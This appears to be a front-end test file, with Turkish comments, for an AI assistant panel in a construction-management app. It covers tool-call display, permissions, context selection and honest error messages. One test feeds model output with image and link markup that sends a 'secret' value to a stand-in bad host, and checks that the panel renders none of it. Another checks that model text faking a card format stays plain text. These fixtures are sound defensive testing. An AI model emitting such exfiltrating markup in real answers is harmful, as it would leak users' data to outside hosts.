import { render, screen, waitFor, within } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AiPanel, bosTur, turaUygula, acilanlariTurets, SEBEP_CUMLELERI } from "./AiPanel";
import { DISA_AKTARIM_SEBEBI } from "./AiBlocks";
import { GERI_BILDIRIM_KAPALI } from "./AiMessage";
import type { AiBlok, AiEvent } from "@/lib/api/ai-chat-client";

const mockSession = vi.hoisted(() => ({
  // IZN-F6a · sayfa izni: genel.fiil_ai (AI_VIEW) + genel.projeler (PROJECTS_VIEW) Görür.
  me: {
    full_name: "Ahmet Yılmaz",
    pages: { "genel.fiil_ai": { level: "view", approve: false }, "genel.projeler": { level: "view", approve: false } },
  } as unknown,
}));
vi.mock("@/components/shell/SessionProvider", () => ({
  useSession: () => ({ me: mockSession.me, isLoading: false }),
}));

function sse(frames: string[]): Response {
  const encoder = new TextEncoder();
  return new Response(
    new ReadableStream({
      start(controller) {
        for (const f of frames) controller.enqueue(encoder.encode(f));
        controller.close();
      },
    }),
    { status: 200, headers: { "content-type": "text/event-stream" } },
  );
}

/**
 * 🔴 `fetch` artık İKİ yolu birden karşılar: SSE akışı (`/api/ai/chat`) ve
 * catch-all BFF üzerinden sohbet/proje okumaları. Tek bir `mockResolvedValue`
 * ikisini de aynı yanıta düşürürdü ve panel testi, ölçmek istemediği bir hatayı
 * ölçerdi.
 */
function stubFetch(akis: Response | (() => Response), json: Record<string, unknown> = {}) {
  vi.stubGlobal(
    "fetch",
    vi.fn(async (input: unknown) => {
      const url = typeof input === "string" ? input : ((input as Request)?.url ?? String(input));
      if (url.includes("/api/ai/chat")) return typeof akis === "function" ? akis() : akis;
      const anahtar = Object.keys(json).find((k) => url.includes(k));
      const govde = anahtar ? json[anahtar] : { items: [], total: 0 };
      return new Response(JSON.stringify(govde), {
        status: 200,
        headers: { "content-type": "application/json" },
      });
    }),
  );
}

function ciz(ui: React.ReactElement) {
  const qc = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={qc}>{ui}</QueryClientProvider>);
}

async function sor(metin: string) {
  const user = userEvent.setup();
  await user.type(screen.getByLabelText("FİİL AI'ya sorun"), metin);
  await user.click(screen.getByRole("button", { name: "Gönder" }));
}

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  mockSession.me = {
    full_name: "Ahmet Yılmaz",
    pages: { "genel.fiil_ai": { level: "view", approve: false }, "genel.projeler": { level: "view", approve: false } },
  };
});

describe("AiPanel", () => {
  it("karsilama karti kullanicinin adiyla gorunur", () => {
    stubFetch(sse([]));
    ciz(<AiPanel />);
    expect(screen.getByText(/Merhaba Ahmet Yılmaz!/)).toBeInTheDocument();
  });

  it("ai:none olan rol AccessDenied gorur", () => {
    stubFetch(sse([]));
    mockSession.me = { full_name: "X", pages: { "genel.fiil_ai": { level: "none", approve: false } } };
    ciz(<AiPanel />);
    expect(screen.getByText("Bu alana yetkiniz yok")).toBeInTheDocument();
    expect(screen.queryByLabelText("FİİL AI'ya sorun")).not.toBeInTheDocument();
  });

  it("UC SUTUN da basilir (mockup: 272px gecmis · orta · 252px baglam)", () => {
    stubFetch(sse([]));
    ciz(<AiPanel />);
    expect(screen.getByLabelText("Sohbet geçmişi")).toBeInTheDocument();
    expect(screen.getByLabelText("FİİL AI Asistanı")).toBeInTheDocument();
    expect(screen.getByLabelText("Sohbet bağlamı")).toBeInTheDocument();
  });

  it("🔴 K4: AI kimlik seridi GOZLE GORUNUR (aria-label olarak degil)", () => {
    stubFetch(sse([]));
    ciz(<AiPanel />);
    // AI-1'de bu üçlü hiçbir yere taşınmamıştı; yalnız `aria-label`dı.
    expect(screen.getByText("FİİL AI")).toBeVisible();
    expect(screen.getByText("Proje verilerinize bağlı")).toBeVisible();
    expect(screen.getByText("Çevrimiçi")).toBeVisible();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 KORKULUK (c) — her araç çağrısı EKRANDA
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 HER arac cagrisi EKRANDA gorunur (arac adi + hal + zarf cumlesi)", async () => {
    stubFetch(
      sse([
        'event: arac_basladi\ndata: {"cagri_id":"c1","arac_adi":"projeleri_listele"}\n\n',
        'event: arac_sonuc\ndata: {"cagri_id":"c1","arac_adi":"projeleri_listele","hal":"Restricted","mesaj":"Bu bilgiyi görme yetkiniz yok (projects). İçerik getirilmedi.","satir_sayisi":null}\n\n',
        'event: metin\ndata: {"metin":"Üç projeniz var."}\n\n',
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("projelerim");

    const izler = await screen.findAllByTestId("ai-arac-izi");
    expect(izler).toHaveLength(1);
    expect(izler[0]).toHaveTextContent("projeleri_listele");
    expect(izler[0]).toHaveTextContent("yetkiniz yok");
    expect(izler[0]).toHaveTextContent("İçerik getirilmedi.");
    expect(screen.getByText("Üç projeniz var.")).toBeInTheDocument();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴🔴 K1 — ZENGİN BLOKLAR ARAÇ SONUCUNDAN, MODEL METNİNDEN DEĞİL
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 K1: model METNI kart gibi gorunen bir sey yazsa bile KART CIZILMEZ", async () => {
    // Model, bloğun tel biçimini metin olarak taklit ediyor.
    const taklit =
      '{\\"tip\\":\\"metrik\\",\\"baslik\\":\\"İşveren Hakedişi\\",\\"deger_metni\\":\\"₺9.999.999\\"}';
    stubFetch(
      sse([
        `event: metin\ndata: {"metin":"${taklit}"}\n\n`,
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("hakediş");

    await waitFor(() => expect(screen.getByText(/İşveren Hakedişi/)).toBeInTheDocument());
    // 🔴 Metin GÖRÜNÜR (düz metin olarak) ama HİÇBİR kart çizilmez.
    expect(screen.queryByTestId("ai-blok-metrik")).not.toBeInTheDocument();
    expect(screen.queryByTestId("ai-blok-oran")).not.toBeInTheDocument();
  });

  it("🔴 K1: kartlar YALNIZ `yapisal_blok` olayindan cizilir", async () => {
    stubFetch(
      sse([
        'event: metin\ndata: {"metin":"Dağılım:"}\n\n',
        'event: yapisal_blok\ndata: {"cagri_id":"c1","arac_adi":"gosterge_ozeti","bloklar":[{"tip":"metrik","baslik":"İşveren Hakedişi","deger_metni":"₺2.100.000","ton":"bilgi","alt_metin":"Hakediş #5 · onay bekliyor","alt_ton":"uyari"},{"tip":"uyari","metin":"Akın İnşaat #47 onaylanmadı.","ton":"uyari","vurgular":["Akın İnşaat #47"]},{"tip":"kaynak","kalemler":[{"etiket":"Hakediş Kayıtları","ekran":"hakedisler","kimlik":null,"birincil":false}]},{"tip":"aksiyon","kalemler":[{"etiket":"Hakedişleri Aç","ekran":"hakedisler","kimlik":null,"birincil":true}]}]}\n\n',
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("hakediş");

    const metrik = await screen.findByTestId("ai-blok-metrik");
    expect(metrik).toHaveTextContent("İşveren Hakedişi");
    expect(metrik).toHaveTextContent("₺2.100.000");
    // Vurgular metnin İÇİNE gömülü bir etiketten değil, ayrı bir alandan gelir.
    const uyari = screen.getByTestId("ai-blok-uyari");
    expect(within(uyari).getByText("Akın İnşaat #47").tagName).toBe("STRONG");
    // Derin bağlantı bilinen rota kataloğundan kurulur — model URL göndermedi.
    const aksiyon = screen.getByTestId("ai-blok-aksiyon");
    expect(within(aksiyon).getByRole("link", { name: "Hakedişleri Aç" })).toHaveAttribute(
      "href",
      "/hakedisler",
    );
  });

  it("🔴 rotasi COZULEMEYEN ekran anahtari SILINMEZ, devre disi + sebep", async () => {
    stubFetch(
      sse([
        'event: yapisal_blok\ndata: {"cagri_id":"c1","arac_adi":"navigate_to","bloklar":[{"tip":"aksiyon","kalemler":[{"etiket":"Şantiye Günlüğü","ekran":"santiye_gunlugu","kimlik":null,"birincil":true}]}]}\n\n',
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("günlük");

    const dugme = await screen.findByRole("button", { name: "Şantiye Günlüğü" });
    expect(dugme).toBeDisabled();
    expect(dugme).toHaveAttribute("title", expect.stringContaining("tek başına bir ekranı yok"));
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 SESSİZ EXFİLTRASYON — savunma KALKMADI
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 model ciktisindan UZAK GORSEL ya da BAGLANTI URETILMEZ", async () => {
    const zehir =
      "![x](https://kotu.example/a.png?d=gizli) <img src=\\\"https://kotu.example/b.png\\\"> [tikla](https://kotu.example)";
    stubFetch(
      sse([
        `event: metin\ndata: {"metin":"${zehir}"}\n\n`,
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    const { container } = ciz(<AiPanel />);
    await sor("gunluk ozeti");

    await waitFor(() => expect(container.textContent).toContain("kotu.example"));
    expect(container.querySelectorAll("img")).toHaveLength(0);
    // 🔴 Uygulama İÇİ bağlantılar (rota kataloğundan) olabilir; DIŞ bağlantı OLAMAZ.
    const disBaglantilar = [...container.querySelectorAll("a[href]")].filter((a) =>
      /^https?:/i.test(a.getAttribute("href") ?? ""),
    );
    expect(disBaglantilar).toHaveLength(0);
    expect(container.textContent).toContain("https://kotu.example/a.png");
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 DÜRÜST HATA ve BİTİŞ SEBEBİ
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 503'te backend'in DURUST metni basilir, 'sistem hatasi' DEGIL", async () => {
    const detay = "AI sağlayıcısı yapılandırılmadı: `AI_PROVIDER` boş.";
    stubFetch(
      new Response(JSON.stringify({ detail: detay }), {
        status: 503,
        headers: { "content-type": "application/json" },
      }),
    );
    ciz(<AiPanel />);
    await sor("selam");
    expect(await screen.findByText(detay)).toBeInTheDocument();
    expect(screen.queryByText(/sistem hatası/i)).not.toBeInTheDocument();
  });

  it("🔴 §5-30: `filtrelendi` ile `bitti` AYNI EKRANA DUSMEZ", async () => {
    stubFetch(
      sse([
        'event: metin\ndata: {"metin":"Yarım cevap"}\n\n',
        'event: tur_bitti\ndata: {"sebep":"filtrelendi","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("selam");
    expect(await screen.findByText(SEBEP_CUMLELERI.filtrelendi)).toBeInTheDocument();
  });

  it("`hata` karesi (oturum doldu) ayri bir bildirim olarak basilir", async () => {
    stubFetch(
      sse([
        'event: hata\ndata: {"kod":"oturum_suresi_doldu","mesaj":"Oturumunuzun süresi doldu. Bu yetkiniz yok DEMEK DEĞİLDİR."}\n\n',
        'event: tur_bitti\ndata: {"sebep":"kesildi","kullanim":{"girdi":null,"cikti":null}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("selam");
    expect(await screen.findByText(/Bu yetkiniz yok DEMEK DEĞİLDİR/)).toBeInTheDocument();
  });

  // ───────────────────────────────────────────────────────────────────────
  // 🔴 K3 — bağlanmamış mockup öğeleri SİLİNMEZ, devre dışı basılır
  // ───────────────────────────────────────────────────────────────────────
  it("🔴 K3: PDF/Excel ve geri bildirim SILINMEZ, DEVRE DISI + SEBEP basilir", async () => {
    stubFetch(
      sse([
        'event: metin\ndata: {"metin":"Stok durumu."}\n\n',
        'event: yapisal_blok\ndata: {"cagri_id":"c1","arac_adi":"navigate_to","bloklar":[{"tip":"aksiyon","kalemler":[{"etiket":"Stok","ekran":"stok","kimlik":null,"birincil":true}]}]}\n\n',
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]),
    );
    ciz(<AiPanel />);
    await sor("stok");

    const pdf = await screen.findByRole("button", { name: "PDF Rapor" });
    expect(pdf).toBeDisabled();
    expect(pdf).toHaveAttribute("title", DISA_AKTARIM_SEBEBI);
    expect(screen.getByRole("button", { name: "Excel'e Aktar" })).toBeDisabled();

    const begen = screen.getByLabelText("Yararlı buldum (bu sürümde kapalı)");
    expect(begen).toBeDisabled();
    expect(begen).toHaveAttribute("title", GERI_BILDIRIM_KAPALI);
    // `Kopyala` GERÇEKTEN çalışır (uca ihtiyacı yok) — kapalı basılmaz.
    expect(screen.getByRole("button", { name: /Kopyala/ })).toBeEnabled();

    const ek = screen.getByLabelText("Dosya ekle (bu sürümde kapalı)");
    expect(ek).toBeDisabled();
  });

  it("mockup'in dort oneri cipi, bes hizli analizi ve alt uyarisi basilir", () => {
    stubFetch(sse([]));
    ciz(<AiPanel />);
    for (const soru of [
      "Nakit akışı nasıl?",
      "Bu hafta ne planlandı?",
      "Gecikmiş tahsilatlar",
      "Proje marj karşılaştır",
    ]) {
      expect(screen.getByRole("button", { name: soru })).toBeInTheDocument();
    }
    for (const baslik of [
      "Hakediş Özeti",
      "Risk Taraması",
      "Kâr Analizi",
      "Haftalık Plan",
      "Fatura Kontrolü",
    ]) {
      expect(screen.getByText(baslik)).toBeInTheDocument();
    }
    expect(
      screen.getByText(/Kritik kararlarda kaynağı doğrulayın/),
    ).toBeInTheDocument();
  });

  it("COKLU TUR: ikinci soru birinciyi EZMEZ", async () => {
    let sayac = 0;
    stubFetch(() => {
      sayac += 1;
      return sse([
        `event: metin\ndata: {"metin":"cevap ${sayac}"}\n\n`,
        'event: tur_bitti\ndata: {"sebep":"bitti","kullanim":{"girdi":1,"cikti":1}}\n\n',
      ]);
    });
    ciz(<AiPanel />);
    await sor("birinci soru");
    expect(await screen.findByText("cevap 1")).toBeInTheDocument();
    await sor("ikinci soru");
    expect(await screen.findByText("cevap 2")).toBeInTheDocument();
    // 🔴 Mockup ÇOKLU TUR gösterir: eski tur ekranda KALIR.
    expect(screen.getByText("birinci soru")).toBeInTheDocument();
    expect(screen.getByText("cevap 1")).toBeInTheDocument();
  });

  it("gecmis sohbetler listeden gelir ve TIKLANABILIR", async () => {
    stubFetch(sse([]), {
      "/ai/conversations": {
        items: [
          {
            id: "11111111-1111-1111-1111-111111111111",
            title: "Güneşkent Hakediş Analizi",
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
            message_count: 4,
          },
        ],
        total: 1,
      },
    });
    ciz(<AiPanel />);
    const kart = await screen.findByRole("button", { name: /Güneşkent Hakediş Analizi/ });
    // 🔴 AI-1'de bu kart DEVRE DIŞIydı (kalıcı sohbet yoktu). A3 kapandı.
    expect(kart).toBeEnabled();
    expect(kart).toHaveTextContent("4 mesaj");
  });

  it("KAYIT 19: gecmis sohbetteki bitis-sebebi uyarisi role=status tasir (canli turdakiyle AYNI)", async () => {
    const conversationId = "11111111-1111-1111-1111-111111111111";
    stubFetch(sse([]), {
      [`/ai/conversations/${conversationId}`]: {
        id: conversationId,
        title: "Güneşkent Hakediş Analizi",
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        bloklar_saklanmadi_notu: "Bu sohbetin kartları saklanmadı.",
        messages: [
          {
            id: "m-1",
            role: "kullanici",
            content: "gunluk ozeti",
            created_at: new Date().toISOString(),
            duration_ms: null,
            finish_reason: null,
            tool_names: [],
            tool_states: [],
          },
          {
            id: "m-2",
            role: "asistan",
            content: "Yarım cevap",
            created_at: new Date().toISOString(),
            duration_ms: 900,
            finish_reason: "filtrelendi",
            tool_names: [],
            tool_states: [],
          },
        ],
      },
      "/ai/conversations": {
        items: [
          {
            id: conversationId,
            title: "Güneşkent Hakediş Analizi",
            created_at: new Date().toISOString(),
            updated_at: new Date().toISOString(),
            message_count: 2,
          },
        ],
        total: 1,
      },
    });
    const user = userEvent.setup();
    ciz(<AiPanel />);
    const kart = await screen.findByRole("button", { name: /Güneşkent Hakediş Analizi/ });
    await user.click(kart);

    const uyari = await screen.findByText(SEBEP_CUMLELERI.filtrelendi);
    expect(uyari).toHaveAttribute("role", "status");
  });
});

describe("turaUygula", () => {
  const bos = bosTur("s", "09:42");

  it("metin parcalari BIRIKTIRILIR (son parca oncekini ezmez)", () => {
    const a = turaUygula(bos, { tip: "metin", metin: "Mer" });
    const b = turaUygula(a, { tip: "metin", metin: "haba" });
    expect(b.metin).toBe("Merhaba");
  });

  it("arac sonucu DOGRU cagriya baglanir", () => {
    let t = turaUygula(bos, { tip: "arac_basladi", cagri_id: "c1", arac_adi: "a" });
    t = turaUygula(t, { tip: "arac_basladi", cagri_id: "c2", arac_adi: "b" });
    t = turaUygula(t, {
      tip: "arac_sonuc",
      cagri_id: "c2",
      arac_adi: "b",
      hal: "Ok",
      mesaj: "2 kayıt getirildi.",
      satir_sayisi: 2,
    });
    expect(t.izler[0]!.sonuc).toBeUndefined();
    expect(t.izler[1]!.sonuc?.hal).toBe("Ok");
  });

  it("yapisal bloklar BIRIKTIRILIR", () => {
    const blok: AiBlok = { tip: "ozet", metin: "özet", vurgular: [] };
    const a = turaUygula(bos, {
      tip: "yapisal_blok",
      cagri_id: "c1",
      arac_adi: "x",
      bloklar: [blok],
    });
    const b = turaUygula(a, {
      tip: "yapisal_blok",
      cagri_id: "c2",
      arac_adi: "y",
      bloklar: [blok],
    });
    expect(b.bloklar).toHaveLength(2);
  });

  it("bilinmeyen olay turu DEGISTIRMEZ", () => {
    expect(turaUygula(bos, { tip: "arac_arguman", cagri_id: "c1", parca: "{" } as AiEvent)).toEqual(
      bos,
    );
  });
});

describe("acilanlariTurets", () => {
  it("YALNIZ kaynak bloklarindan turer ve TEKRARI eler", () => {
    const kaynak: AiBlok = {
      tip: "kaynak",
      kalemler: [
        { etiket: "Stok", ekran: "stok", kimlik: null, birincil: false },
        { etiket: "Stok", ekran: "stok", kimlik: null, birincil: false },
        { etiket: "Şantiyeler", ekran: "santiyeler", kimlik: null, birincil: false },
      ],
    };
    const aksiyon: AiBlok = {
      tip: "aksiyon",
      kalemler: [{ etiket: "Aç", ekran: "hakedisler", kimlik: null, birincil: true }],
    };
    const sonuc = acilanlariTurets([kaynak, aksiyon]);
    expect(sonuc.map((s) => s.etiket)).toEqual(["Stok", "Şantiyeler"]);
    expect(sonuc[0]!.yol).toBe("/stok");
    // 🔴 Çözülemeyen anahtar `null` yol + SEBEP taşır (uydurma yol YOK).
    expect(sonuc[1]!.yol).toBeNull();
    expect(sonuc[1]!.sebep).toContain("tek başına bir ekranı yok");
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// AI-BAĞLAM — "Sohbet Bağlamı" paneli GERÇEK bağlam
//
// Kullanıcının bildirdiği hâl: *Dönem: bağlanmadı · İlerleme: %0 · Aktif işçi:
// bağlanmadı*. Üçünün de kökü ÖLÇÜLDÜ ve üçü de burada bekçilenir.
// ═══════════════════════════════════════════════════════════════════════════

/** `SiteCard` zarflarının DOLU dalı — backend `_worker_count` / ILR-1 hâli. */
const SANTIYE_DOLU = {
  id: "s-1",
  slug: "a-blok-santiyesi",
  code: "A-BLOK",
  name: "A-Blok Şantiyesi",
  status: "active",
  worker_count: { available: true, count: 48, pending_module: "timesheet" },
  progress_pct: { available: true, value: "62", pending_module: null },
};

/** BOŞ dal — K-IKIZ1: fikstür evreni iki dalı da taşır. */
const SANTIYE_BOS = {
  id: "s-2",
  slug: "b-blok-santiyesi",
  code: "B-BLOK",
  name: "B-Blok Şantiyesi",
  status: "active",
  worker_count: { available: false, count: null, pending_module: "timesheet" },
  progress_pct: { available: false, value: null, pending_module: "site_diary" },
};

/** 3. HÂL — `restricted()`: izin yok, `pending_module` NULL, ipucu VERİLMEZ. */
const SANTIYE_YASAK = {
  id: "s-3",
  slug: "c-blok",
  code: "C-BLOK",
  name: "C-Blok Şantiyesi",
  status: "active",
  worker_count: { available: false, count: null, pending_module: "timesheet" },
  progress_pct: { available: false, value: null, pending_module: null },
};

const PROJE_FOSIL = {
  id: "p-1",
  name: "Kule A",
  code: "PRJ-1",
  // 🔴 FOSİL sütun: `projects.progress_pct` DAİMA 0'dır (yazma yolu yok).
  // Panel bunu okursa ekran "%0" basar — kusurun ta kendisi.
  progress_pct: "0",
};

/**
 * `/projects` + `/projects/{id}/sites` yanıtlarını kurar.
 * 🔴 Anahtar sırası ÖNEMLİ: `stubFetch` İLK eşleşen anahtarı alır ve
 * `/projects` deseni şantiye yolunu da yakalar.
 */
function baglamStub(santiyeler: unknown[], projeler: unknown[] = [PROJE_FOSIL]) {
  stubFetch(sse([]), {
    "/sites": { items: santiyeler, counts: {}, totals: {} },
    "/projects": { items: projeler, total: projeler.length, counts: {} },
  });
}

describe("AiPanel · Sohbet Bağlamı (AI-BAĞLAM)", () => {
  it("🔴 proje → SANTIYE kaskadi: ikinci secici basilir ve santiye ADI yazar", async () => {
    baglamStub([SANTIYE_DOLU, SANTIYE_BOS]);
    ciz(<AiPanel />);

    const panel = screen.getByLabelText("Sohbet bağlamı");
    // Mockup 368 "📍 A-Blok Şantiyesi" — burada PROJE KODU değil ŞANTİYE ADI.
    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-santiye")).toHaveTextContent(
        "A-Blok Şantiyesi",
      ),
    );
    expect(within(panel).getByLabelText("Bağlamı Değiştir")).toBeInTheDocument();
    expect(within(panel).getByLabelText("Şantiye Seç")).toBeInTheDocument();
    // Eski kusur: projenin `code`u basılıyordu.
    expect(within(panel).queryByText(/PRJ-1/)).not.toBeInTheDocument();
  });

  it("🔴 DOLU zarf: gercek ilerleme + gercek isci sayisi basilir", async () => {
    baglamStub([SANTIYE_DOLU]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");

    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-ilerleme")).toHaveTextContent("%62"),
    );
    expect(within(panel).getByTestId("ai-baglam-isci")).toHaveTextContent("48");
    // Dönem TÜRETİLİR: mockup'ın "Temmuz 2026" sabiti kopyalanmaz.
    expect(within(panel).getByTestId("ai-baglam-donem")).not.toBeEmptyDOMElement();
    // 🔴 FOSİL sütun ARTIK OKUNMUYOR: "%0" hiçbir hâlde basılamaz.
    expect(within(panel).queryByText("%0")).not.toBeInTheDocument();
    // 🔴 "bağlanmadı" kelimesi ekrandan KALKTI — yalandı.
    expect(within(panel).queryByText(/bağlanmadı/)).not.toBeInTheDocument();
  });

  it("🔴 BOS zarf: SAYI DEGIL sebep — `%0` uydurulmaz", async () => {
    baglamStub([SANTIYE_BOS]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");

    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-santiye")).toHaveTextContent(
        "B-Blok Şantiyesi",
      ),
    );
    // Boş zarf "—" basar; `%0`/`0` gibi yetkili görünen bir sayı ASLA.
    expect(within(panel).queryByText("%0")).not.toBeInTheDocument();
    const ilerleme = within(panel).getByTestId("ai-baglam-ilerleme");
    const isci = within(panel).getByTestId("ai-baglam-isci");
    expect(ilerleme).toHaveTextContent("—");
    expect(isci).toHaveTextContent("—");
    // 2. hâl: gerekçe BİLİNİYOR → ipucu var.
    expect(ilerleme).toHaveAttribute("title");
    expect(isci).toHaveAttribute("title");
  });

  it("🔴 3. HAL (`restricted`): modül yok demek YALAN → ipucu: Bu bilgi rolünüz için gizli (IZN-F4.2)", async () => {
    baglamStub([SANTIYE_YASAK]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");

    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-santiye")).toHaveTextContent(
        "C-Blok Şantiyesi",
      ),
    );
    // İlerleme satırı `restricted()` — `pending_module: null` → ipucu YOK.
    expect(within(panel).getByTestId("ai-baglam-ilerleme")).toHaveAttribute("title", "Bu bilgi rolünüz için gizli");
    // Kardeş satır 2. hâlde ve ipucunu TAŞIR — ayrım gerçekten yapılıyor.
    expect(within(panel).getByTestId("ai-baglam-isci")).toHaveAttribute("title");
  });

  it("santiyesi olmayan projede uc satir da 'Şantiye seçin' der", async () => {
    baglamStub([]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");

    await waitFor(() =>
      expect(within(panel).getByText("Bu projede görünen bir şantiye yok.")).toBeVisible(),
    );
    // 🔴 "bağlanmadı" DEĞİL: veri bağlıdır, eksik olan KAPSAMDIR.
    // 📍 satırı + üç kapsam satırı = dört.
    expect(within(panel).getAllByText("Şantiye seçin").length).toBe(4);
    expect(within(panel).queryByLabelText("Şantiye Seç")).not.toBeInTheDocument();
  });

  it("🔴 SECILEN KAPSAM ISTEGE BINER — panel ile govde AYNI kimlikleri tasir", async () => {
    baglamStub([SANTIYE_DOLU, SANTIYE_BOS]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");
    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-ilerleme")).toHaveTextContent("%62"),
    );

    await sor("merhaba");

    const cagri = (globalThis.fetch as unknown as ReturnType<typeof vi.fn>).mock.calls.find(
      (c) => String(c[0]).includes("/api/ai/chat"),
    );
    expect(cagri).toBeDefined();
    expect(JSON.parse(String((cagri![1] as RequestInit).body))).toEqual({
      mesaj: "merhaba",
      project_id: "p-1",
      site_id: "s-1",
    });
  });

  it("🔴 SANTIYE DEGISINCE govdedeki `site_id` de degisir", async () => {
    baglamStub([SANTIYE_DOLU, SANTIYE_BOS]);
    ciz(<AiPanel />);
    const panel = screen.getByLabelText("Sohbet bağlamı");
    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-ilerleme")).toHaveTextContent("%62"),
    );

    const user = userEvent.setup();
    await user.selectOptions(within(panel).getByLabelText("Şantiye Seç"), "s-2");
    await waitFor(() =>
      expect(within(panel).getByTestId("ai-baglam-santiye")).toHaveTextContent(
        "B-Blok Şantiyesi",
      ),
    );

    await sor("merhaba");
    const cagri = (globalThis.fetch as unknown as ReturnType<typeof vi.fn>).mock.calls.find(
      (c) => String(c[0]).includes("/api/ai/chat"),
    );
    expect(JSON.parse(String((cagri![1] as RequestInit).body)).site_id).toBe("s-2");
  });

  it("🔴 'Erişilen veriler' bos kumede 'bilinmiyor' DEMEZ", async () => {
    baglamStub([SANTIYE_DOLU]);
    ciz(<AiPanel />);
    const gecmis = screen.getByLabelText("Sohbet geçmişi");
    // "bilinmiyor" = ÖLÇÜLEMEDİ. Oysa ölçüm tamdır, sonucu sıfırdır.
    expect(within(gecmis).queryByText("bilinmiyor")).not.toBeInTheDocument();
    expect(within(gecmis).getByText("henüz araç çağrılmadı")).toBeVisible();
  });

  it("🔴 KAYIT NO 22 — projects görüntüleme izni yokken GET /projects ağa çıkmaz", async () => {
    mockSession.me = {
      full_name: "Ahmet Yılmaz",
      pages: { "genel.fiil_ai": { level: "view", approve: false }, "genel.projeler": { level: "none", approve: false } },
    };
    baglamStub([SANTIYE_DOLU]);
    ciz(<AiPanel />);

    // Panel yine de açılır (ai görünür), ama proje listesi hiç istenmemelidir.
    await screen.findByLabelText("FİİL AI'ya sorun");
    const projeCagrisi = (globalThis.fetch as unknown as ReturnType<typeof vi.fn>).mock.calls.find(
      (c) => String(c[0]).includes("/projects"),
    );
    expect(projeCagrisi).toBeUndefined();
  });
});
